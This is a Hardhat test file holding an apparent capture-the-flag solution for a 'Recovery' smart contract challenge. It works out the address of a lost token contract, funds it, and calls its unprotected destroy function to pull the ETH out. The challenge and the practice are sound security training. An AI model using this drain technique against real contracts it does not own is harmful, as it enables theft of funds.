import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { BigNumber, Contract } from 'ethers';

const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Recovery', function () {
  let deployer: SignerWithAddress, someUser: SignerWithAddress;
  let recovery: Contract;
  let simpleToken: Contract;

  const value: BigNumber = ethers.utils.parseEther('1');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, someUser] = await ethers.getSigners();

    recovery = await (
      await ethers.getContractFactory('Recovery', deployer)
    ).deploy();

    recovery.generateToken('Token A', 100);
  });

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    const recoveryAttacker = await (
      await ethers.getContractFactory('RecoveryAttacker', deployer)
    ).deploy();

    const lostAddress = await recoveryAttacker.getLostContract(
      recovery.address
    );

    deployer.sendTransaction({
      to: lostAddress,
      value,
    });

    const SimpleTokenFactory = await ethers.getContractFactory('SimpleToken');

    // Attach the contract at the given address
    simpleToken = SimpleTokenFactory.attach(lostAddress);

    expect(await simpleToken.balances(deployer.address)).to.be.eq(
      value.mul(10)
    );

    expect(await ethers.provider.getBalance(simpleToken.address)).to.be.eq(
      value
    );

    await simpleToken.destroy(deployer.address);
  });

  after(async function () {
    expect(await ethers.provider.getBalance(simpleToken.address)).to.be.eq(0);
  });
});
